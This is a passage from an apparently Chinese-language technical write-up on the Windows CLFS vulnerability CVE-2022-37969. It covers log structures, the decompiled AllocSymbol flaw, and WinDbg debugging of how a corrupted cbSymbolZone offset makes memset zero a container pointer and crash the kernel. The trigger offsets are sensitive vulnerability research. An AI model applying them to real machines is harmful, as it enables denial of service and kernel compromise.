</span></span><span style=display:flex><span>	USHORT bUnused;
</span></span><span style=display:flex><span>	CLFS_LOG_STATE eLogState;
</span></span><span style=display:flex><span>	UCHAR cUsn;
</span></span><span style=display:flex><span>	UCHAR cClients;
</span></span><span style=display:flex><span>} CLFS_BASE_RECORD_HEADER, <span style=color:#f92672>*</span> PCLFS_BASE_RECORD_HEADER;
</span></span></code></pre></div><p>内存布局：</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/2.png></p><p>此次漏洞重点字段：</p><ul><li><p>rgContainers</p><p>存储了<code>CLFS_CONTAINER_CONTEXT</code>数组相对于基本块的偏移</p></li><li><p>rgClients</p><p>存储了<code>_CLFS_CLIENT_CONTEXT</code> 数组相对于基本块的偏移</p></li><li><p>cbSymbolZone</p><p>表示符号区中下一个可用的空闲偏移量，用于存储新符号。</p></li></ul><p>基本记录中，client context, container context, shared security context由symbols表示，在symbols前面是<code>CLFSHASHSYM</code>结构</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_NODE_ID {
</span></span><span style=display:flex><span>  ULONG cType;
</span></span><span style=display:flex><span>  ULONG cbNode;
</span></span><span style=display:flex><span>} CLFS_NODE_ID, <span style=color:#f92672>*</span>PCLFS_NODE_ID;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFSHASHSYM
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    CLFS_NODE_ID cidNode;
</span></span><span style=display:flex><span>    ULONG ulHash;
</span></span><span style=display:flex><span>    ULONG cbHash;
</span></span><span style=display:flex><span>    ULONGLONG ulBelow;
</span></span><span style=display:flex><span>    ULONGLONG ulAbove;
</span></span><span style=display:flex><span>    LONG cbSymName;
</span></span><span style=display:flex><span>    LONG cbOffset;
</span></span><span style=display:flex><span>    BOOLEAN fDeleted;
</span></span><span style=display:flex><span>} CLFSHASHSYM, <span style=color:#f92672>*</span>PCLFSHASHSYM;
</span></span></code></pre></div><p>内存布局</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/3.png></p><p>在基本记录中，client context标示一个日志文件的client。client context结构如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_NODE_ID {
</span></span><span style=display:flex><span>  ULONG cType;
</span></span><span style=display:flex><span>  ULONG cbNode;
</span></span><span style=display:flex><span>} CLFS_NODE_ID, <span style=color:#f92672>*</span>PCLFS_NODE_ID;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_CLIENT_CONTEXT
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    CLFS_NODE_ID cidNode;
</span></span><span style=display:flex><span>    CLFS_CLIENT_ID cidClient;
</span></span><span style=display:flex><span>    USHORT fAttributes;
</span></span><span style=display:flex><span>    ULONG cbFlushThreshold;
</span></span><span style=display:flex><span>    ULONG cShadowSectors;
</span></span><span style=display:flex><span>    ULONGLONG cbUndoCommitment;
</span></span><span style=display:flex><span>    LARGE_INTEGER llCreateTime;
</span></span><span style=display:flex><span>    LARGE_INTEGER llAccessTime;
</span></span><span style=display:flex><span>    LARGE_INTEGER llWriteTime;
</span></span><span style=display:flex><span>    CLFS_LSN lsnOwnerPage;
</span></span><span style=display:flex><span>    CLFS_LSN lsnArchiveTail;
</span></span><span style=display:flex><span>    CLFS_LSN lsnBase;
</span></span><span style=display:flex><span>    CLFS_LSN lsnLast;
</span></span><span style=display:flex><span>    CLFS_LSN lsnRestart;
</span></span><span style=display:flex><span>    CLFS_LSN lsnPhysicalBase;
</span></span><span style=display:flex><span>    CLFS_LSN lsnUnused1;
</span></span><span style=display:flex><span>    CLFS_LSN lsnUnused2;
</span></span><span style=display:flex><span>    CLFS_LOG_STATE eState; <span style=color:#75715e>//+0x78
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>union</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        HANDLE hSecurityContext;
</span></span><span style=display:flex><span>        ULONGLONG ullAlignment;
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>} CLFS_CLIENT_CONTEXT, <span style=color:#f92672>*</span>PCLFS_CLIENT_CONTEXT;
</span></span></code></pre></div><p>container context结构和日志文件添加容器有关，container context结构</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_CONTAINER_CONTEXT
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    CLFS_NODE_ID cidNode; <span style=color:#75715e>//8 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    ULONGLONG cbContainer; <span style=color:#75715e>//8 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    CLFS_CONTAINER_ID cidContainer; <span style=color:#75715e>// 4 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    CLFS_CONTAINER_ID cidQueue; <span style=color:#75715e>// 4 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>union</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        CClfsContainer<span style=color:#f92672>*</span> pContainer; <span style=color:#75715e>//8 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        ULONGLONG ullAlignment;
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    CLFS_USN usnCurrent;
</span></span><span style=display:flex><span>    CLFS_CONTAINER_STATE eState;
</span></span><span style=display:flex><span>    ULONG cbPrevOffset; <span style=color:#75715e>//4 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    ULONG cbNextOffset; <span style=color:#75715e>//4 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} CLFS_CONTAINER_CONTEXT, <span style=color:#f92672>*</span>PCLFS_CONTAINER_CONTEXT;
</span></span></code></pre></div><p>内存布局</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/4.png></p><p>其中pContainer是指向CClfsContainer对象的指针</p><p><strong>漏洞点</strong></p><p>该处获取通过<code>GetBaseLogRecord</code>函数获取<code>BaseLogRecord</code>，之后的<code>cbSymbolZone</code>，判断cbSymbolZone+v4是否大于SignaturesOffset的，如果判断通过则通过memset将BaseLogRecord+cbSymbolZone内存清零，大小为v4。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>AllocSymbol</span>(CClfsBaseFilePersisted <span style=color:#f92672>*</span>this, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> a2, <span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>a3)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> v4; <span style=color:#75715e>// rbp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>BaseLogRecord; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v6; <span style=color:#75715e>// r8 this指针
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>v7; <span style=color:#75715e>// rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CLFS_LOG_BLOCK_HEADER <span style=color:#f92672>*</span>v8; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> cbSymbolZone; <span style=color:#75715e>// r8
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> result; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> a2;
</span></span><span style=display:flex><span>  BaseLogRecord <span style=color:#f92672>=</span> (CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>)CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>GetBaseLogRecord</span>(this);
</span></span><span style=display:flex><span>  v7 <span style=color:#f92672>=</span> BaseLogRecord;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>BaseLogRecord )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3222929421</span>i64;
</span></span><span style=display:flex><span>  v8 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(CLFS_LOG_BLOCK_HEADER <span style=color:#f92672>**</span>)(<span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>48</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>48</span>i64);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>a3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  cbSymbolZone <span style=color:#f92672>=</span> BaseLogRecord<span style=color:#f92672>-&gt;</span>cbSymbolZone;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>BaseLogRecord[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> cbSymbolZone <span style=color:#f92672>+</span> v4 <span style=color:#f92672>&gt;</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(<span style=color:#f92672>&amp;</span>v8<span style=color:#f92672>+</span> v8<span style=color:#f92672>-&gt;</span>SignaturesOffset) )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3221225507</span>i64;
</span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b000  15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00  ....=.=.........
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b010  02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff  ................
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b020  00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00  ........p.......
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b030  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b060  00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00  .........y......
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ffff970a`4995b070  05 00 00 00 00 00 00 00-aa fb b6 33 fa f9 ed 11  ...........3....
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  v10 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>BaseLogRecord[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> cbSymbolZone;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(v10, <span style=color:#ae81ff>0</span>, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v4);
</span></span><span style=display:flex><span>  v7<span style=color:#f92672>-&gt;</span>cbSymbolZone <span style=color:#f92672>+=</span> v4;
</span></span><span style=display:flex><span>  result <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>a3 <span style=color:#f92672>=</span> v10;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=影响版本>影响版本</h3><p>略</p><h3 id=环境搭建>环境搭建</h3><ul><li>Windows 10 21H2</li><li>windbg</li></ul><h3 id=技术分析调试>技术分析&调试</h3><p>基于该漏洞点有两种利用方式，第一种将<code>cbSymbolZone</code>修改为自身的<code>CLFS_CONTAINER_CONTEXT->pContainer</code>结构偏移，由于<code>CLFS_CONTAINER_CONTEXT</code>内存有<code>Container context</code>对象指针。使用<code>memset</code>清空该指针，当解引用该指针将触发异常，导致蓝屏。</p><p>第二种将<code>cbSymbolZone</code> 修改为下个BLF文件的<code>CLFS_CONTAINER_CONTEXT->pContainer</code>结构偏移，利用漏洞将该指针清零，解引用第二个BLF文件的<code>CLFS_CONTAINER_CONTEXT->pContainer</code> 将导致蓝屏，这种方式利用需要绕过<code>(char *)&amp;BaseLogRecord[1] + cbSymbolZone + v4 > (char *)(&amp;v8+ v8->SignaturesOffset)</code></p><p><strong>第一种利用方式</strong></p><p>在调试中发现<code>CLFS_CONTAINER_CONTEXT</code>结构距离<code>CLFS_BASE_RECORD_HEADER</code>结束为0x128，<code>pContainer</code>指针距离<code>CLFS_BASE_RECORD_HEADER</code>为0x130，此处要清空高四位（内核解引用指针会校验指针是否为NULL，所以不能把所有的位都清零），则应设为144。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> dq ffff970a4995c4d0
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c4d0  <span style=color:#ae81ff>00000030</span><span style=color:#960050;background-color:#1e0010>`</span>c1fdf008 <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>000</span><span style=color:#ae81ff>80000</span>
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c4e0  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>45f</span><span style=color:#ae81ff>7</span>cd40
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c4f0  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c500  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c510  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c520  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c530  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c540  <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> rr8
</span></span><span style=display:flex><span>r8<span style=color:#f92672>=</span><span style=color:#ae81ff>000000000000000</span>c
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> rrdi
</span></span><span style=display:flex><span>rdi<span style=color:#f92672>=</span>ffff970a4995b070
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>?</span>ffff970a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>4995</span>c4d0<span style=color:#f92672>-</span>ffff970a4995b070
</span></span><span style=display:flex><span>Evaluate expression: <span style=color:#ae81ff>5216</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00001460</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>?</span><span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00001460</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x1338</span>
</span></span><span style=display:flex><span>Evaluate expression: <span style=color:#ae81ff>296</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000012</span><span style=color:#ae81ff>8</span>
</span></span></code></pre></div><p>在<code>clfs!CClfsBaseFilePersisted::AllocSymbol</code>下断点，运行PoC</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>bp clfs<span style=color:#f92672>!</span>CClfsBaseFilePersisted::AllocSymbol
</span></span></code></pre></div><p><code>CLFS!CClfsBaseFilePersisted::AllocSymbol</code>通过调用<code>CLFS!CClfsBaseFile::GetBaseLogRecord</code>获取到了基本记录头，可以看到<code>_CLFS_BASE_RECORD_HEADER→cbSymbolZone</code>已被设为144</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>1: kd<span style=color:#f92672>&gt;</span> db rax
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f383070  05 00 00 00 00 00 00 00<span style=color:#f92672>-</span>a1 a9 21 b4 31 0f ee 11  ..........<span style=color:#f92672>!</span>.<span style=color:#a6e22e>1</span>...
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f383080  bc 69 00 0c 29 07 fc 32<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  .<span style=color:#a6e22e>i</span>..)..<span style=color:#a6e22e>2</span>........
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f383090  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3830a0  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3830b0  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3830c0  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>38 13 00 00 00 00 00 00  ........<span style=color:#a6e22e>8</span>.......
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3830d0  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3830e0  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>1: kd<span style=color:#f92672>&gt;</span> db rax <span style=color:#f92672>+</span> 0x1328
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384398  44 01 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 03 01 01 00 00 00  D...............
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3843a8  06 f0 fd c1 30 00 00 00<span style=color:#f92672>-</span>16 00 d2 02 b8 00 00 00  ....<span style=color:#a6e22e>0</span>...........
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3843b8  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3843c8  f0 13 00 00 68 13 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ....<span style=color:#a6e22e>h</span>...........
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3843d8  07 f0 fd c1 88 00 00 00<span style=color:#f92672>-</span>00 00 00 01 40 9c 00 00  ............<span style=color:#960050;background-color:#1e0010>@</span>...
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3843e8  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3843f8  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 00 00 00 00  ................
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384408  00 00 00 00 00 00 00 00<span style=color:#f92672>-</span>00 00 00 00 ff ff ff ff  ................
</span></span></code></pre></div><p>而后对<code>BaseLogRecord+0x1338+cbSymbolZone</code>处大小为v4的内存调用memset清零</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>v4 <span style=color:#f92672>=</span> a2;
</span></span><span style=display:flex><span>  BaseLogRecord <span style=color:#f92672>=</span> (CLFS_BASE_RECORD_HEADER <span style=color:#f92672>*</span>)CClfsBaseFile::GetBaseLogRecord(<span style=color:#66d9ef>this</span>);
</span></span><span style=display:flex><span>  v7 <span style=color:#f92672>=</span> BaseLogRecord;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>BaseLogRecord )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> 3222929421i64;
</span></span><span style=display:flex><span>  v8 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(CLFS_LOG_BLOCK_HEADER <span style=color:#f92672>**</span>)(<span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)(v6 <span style=color:#f92672>+</span> 48) <span style=color:#f92672>+</span> 48i64);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>a3 <span style=color:#f92672>=</span> 0i64;
</span></span><span style=display:flex><span>  cbSymbolZone <span style=color:#f92672>=</span> BaseLogRecord<span style=color:#f92672>-&gt;</span>cbSymbolZone;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>BaseLogRecord<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#f92672>+</span> cbSymbolZone <span style=color:#f92672>+</span> v4 <span style=color:#f92672>&gt;</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(<span style=color:#f92672>&amp;</span>v8<span style=color:#f92672>-&gt;</span>MajorVersion <span style=color:#f92672>+</span> v8<span style=color:#f92672>-&gt;</span>SignaturesOffset) )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> 3221225507i64;
</span></span><span style=display:flex><span>  v10 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>BaseLogRecord<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#f92672>+</span> cbSymbolZone;
</span></span><span style=display:flex><span>  memset(v10, 0, (unsigned <span style=color:#66d9ef>int</span>)v4);
</span></span></code></pre></div><p>在调试器中可以看到rcx指向了<code>CLFS_CONTAINER_CONTEXT->pContainer</code> 的高四位。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>1: kd<span style=color:#f92672>&gt;</span> dd rcx <span style=color:#f92672>-</span> 0x1c
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844d0  c1fdf008 00000030 00080000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844e0  00000000 00000000 4bd8b7c0 ffffbd84
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844f0  00000001 00000002 00000000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384500  003f005c 005c003f 003a0043 0055005c
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384510  00650073 00730072 0050005c 00620075
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384520  0069006c 005c0063 0063002e 006e006f
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384530  00610074 006e0069 00720065 0031005f
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384540  00310034 00000000 00000000 00000000
</span></span><span style=display:flex><span>1: kd<span style=color:#f92672>&gt;</span> u
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted::AllocSymbol<span style=color:#f92672>+</span>0x67:
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d0207 e874c8fcff      call    CLFS<span style=color:#f92672>!</span>memset (fffff801<span style=color:#960050;background-color:#1e0010>`</span>2709ca80)
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d020c 01af28130000    add     dword ptr <span style=color:#f92672>[</span>rdi<span style=color:#f92672>+</span>1328h<span style=color:#f92672>]</span>,ebp
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d0212 33c0            xor     eax,eax
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d0214 48891e          mov     qword ptr <span style=color:#f92672>[</span>rsi<span style=color:#f92672>]</span>,rbx
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d0217 488b5c2430      mov     rbx,qword ptr <span style=color:#f92672>[</span>rsp<span style=color:#f92672>+</span>30h<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d021c 488b6c2438      mov     rbp,qword ptr <span style=color:#f92672>[</span>rsp<span style=color:#f92672>+</span>38h<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d0221 488b742440      mov     rsi,qword ptr <span style=color:#f92672>[</span>rsp<span style=color:#f92672>+</span>40h<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d0226 4883c420        add     rsp,20h
